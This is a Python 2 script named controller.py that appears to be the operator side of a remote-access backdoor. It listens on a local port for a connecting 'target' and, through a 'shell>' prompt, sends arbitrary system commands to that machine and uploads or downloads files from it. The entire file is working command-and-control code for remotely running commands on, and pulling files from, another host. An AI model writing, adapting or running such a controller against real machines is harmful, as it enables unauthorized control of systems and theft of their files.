#!/usr/bin/python
#-*- coding:utf-8 -*-

'''
    File Name: controller.py
    Function: To control host by this script
'''

import os
import time
import socket

RECV_SIZE = 2048

def connect(): 
    '''
    Usage:
        command: To run a system command
            Ex: ls -la

        upload: To upload a file to target
            Ex use: upload file_path
                    upload ./test.txt

        download: To download a file from target
            Ex use: download file_path 

    '''
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind(("127.0.0.1",5559))
    s.listen(1)
    conn,addr = s.accept()
    print "---> we got a connection from: ",addr
    while True:
        command = raw_input("shell>")
        if "exit" in command:
            conn.send("exit")
            response = conn.recv(RECV_SIZE)
            if 'ACK' in response:
                time.sleep(0.5)
                conn.close()
            else:
                time.sleep(0.5)
                conn.close()
            break
        elif "upload" in command:
            filepath = command.split()[1]
            if not os.path.exists(filepath):
                print "%s is not exist" % filepath
                continue
            conn.send(command)
            uploadFile(conn,filepath)       
            

        elif "download" in command:
            conn.send(command)
            target_file_path = command.split()[1]
            filename = target_file_path.split('/')[-1]
            downloadFile(conn,filename)
            
        else:
            conn.send(command)
            print conn.recv(RECV_SIZE)


def uploadFile(client_socket,filepath):
    '''
    @filepath: loacl file path
    Func: upload file to target host current path.

    '''
    file = open(filepath)
    while True:
        filedata = file.read(RECV_SIZE)
        if not filedata:
            break
        client_socket.send(filedata)
        
    print client_socket.recv(RECV_SIZE)


def downloadFile(client_socket,filename):
    '''
    @tf_path: target host file path
    Func: download file from target host file to 
          local host current path.

    '''
    filedata = ''
    recv_len = 1
    while recv_len:
        data = client_socket.recv(RECV_SIZE)
        recv_len = len(data)
        filedata += data
        if recv_len < RECV_SIZE:
            break

    i=1
    tmpname = filename
    while os.path.exists(tmpname):
        name = filename.split('.')
        name[0] += str(i)
        filename = '.'.join(name)
        tmpname = filename
        i += 1
    file = open(filename,'w')
    file.write(filedata)
    file.close()
    print '下载%s成功'%filename 


def main():
    connect()
if __name__ == '__main__':
    main()
